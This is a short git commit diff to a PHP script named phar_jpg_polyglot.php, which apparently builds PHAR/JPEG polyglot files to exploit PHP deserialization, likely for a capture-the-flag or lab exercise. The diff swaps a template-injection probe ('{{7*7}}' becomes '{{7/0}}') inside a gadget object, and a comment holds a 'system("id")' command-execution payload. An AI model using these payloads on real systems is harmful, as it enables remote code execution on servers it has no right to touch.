8b4cc72b3829ac3d5a289032a9b84049cac333c5
hoangdat2407 <82460838+hoangdat2407@users.noreply.github.com>
2026-06-16 10:38:40 +0700

    Save phar_jpg_polyglot.php at 2026-06-16 10:38:40

--- phar_jpg_polyglot.php
+++ phar_jpg_polyglot.php
@@ -101,7 +101,7 @@ function generate_polyglot($phar, $jpeg){
 // $object->inject = 'system("id");';
 // $object->out = 'Hallo World';
 
-$object = new CustomTemplate(new Blog("abc","{{7*7}}Hello"));
+$object = new CustomTemplate(new Blog("abc","{{7/0}}Hello"));
 
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
@@ -126,3 +126,4 @@ $outfile = 'out.gif';
 file_put_contents($outfile, generate_base_phar($payload, $prefix));
 
 */
+
